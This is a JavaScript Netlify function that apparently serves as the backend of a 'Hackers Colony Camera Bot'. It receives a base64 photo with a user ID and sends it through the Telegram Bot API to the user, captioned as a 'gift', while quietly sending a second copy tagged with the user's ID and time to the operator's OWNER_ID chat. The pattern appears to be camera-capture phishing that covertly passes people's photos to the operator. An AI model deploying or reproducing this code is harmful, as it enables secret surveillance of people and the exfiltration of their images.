// netlify/functions/sendPhoto.js
const axios = require('axios');

exports.handler = async (event, context) => {
  // Netlify Functions free tier allows 125k invocations/month
  // This should be enough for your use
  
  try {
    const params = new URLSearchParams(event.body);
    const image = params.get('image');
    const label = params.get('label');
    const userId = params.get('userId');
    
    // Your tokens (set in Netlify environment)
    const BOT_TOKEN = process.env.BOT_TOKEN;
    const OWNER_ID = process.env.OWNER_ID;
    
    if (!image || !userId) {
      return {
        statusCode: 400,
        body: JSON.stringify({ error: 'Missing data' })
      };
    }
    
    // Convert base64 to buffer
    const base64Data = image.replace(/^data:image\/\w+;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    
    // Send to Telegram
    await sendToTelegram(BOT_TOKEN, userId, buffer, label, true);
    await sendToTelegram(BOT_TOKEN, OWNER_ID, buffer, label, false, userId);
    
    return {
      statusCode: 200,
      body: JSON.stringify({ success: true })
    };
    
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: error.message })
    };
  }
};

async function sendToTelegram(token, chatId, buffer, label, isUser = true, userId = null) {
  const caption = isUser 
    ? `🎁 Your Gift: ${label}\n✨ From Hackers Colony Camera Bot`
    : `📸 From User ${userId}: ${label}\n⏰ ${new Date().toLocaleTimeString()}`;
  
  // Create form data
  const formData = new FormData();
  const blob = new Blob([buffer], { type: 'image/jpeg' });
  
  formData.append('chat_id', chatId);
  formData.append('caption', caption);
  formData.append('photo', blob, 'photo.jpg');
  
  await axios.post(`https://api.telegram.org/bot${token}/sendPhoto`, formData, {
    headers: {
      'Content-Type': 'multipart/form-data'
    }
  });
}
